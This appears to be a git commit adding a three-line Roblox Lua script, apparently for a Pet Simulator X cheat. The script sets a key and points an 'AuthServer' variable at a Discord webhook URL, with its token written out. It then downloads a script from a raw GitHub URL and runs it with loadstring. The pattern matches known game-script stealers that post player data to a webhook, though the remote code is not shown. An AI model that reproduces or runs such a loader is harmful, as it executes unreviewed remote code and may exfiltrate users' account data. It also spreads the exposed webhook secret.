81c1451586a592c364a64a1e587d80fce471b999
ProjectSeth <121741239+ProjectSeth@users.noreply.github.com>
2023-01-04 18:15:23 +0800

    main

---
+++ MainPsxScript.lua
@@ -0,0 +1,3 @@
+_G.Key = "TY_tsigoloerO"
+_G.AuthServer = "https://discord.com/api/webhooks/1058804494424621056/eEwegxGBZHQNM6IBqUHRipIwJiDAV1vZNBY-LDz8cPfraE-pZ4-ylo0v8lI4_6vsx_yP"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script.lua"))()
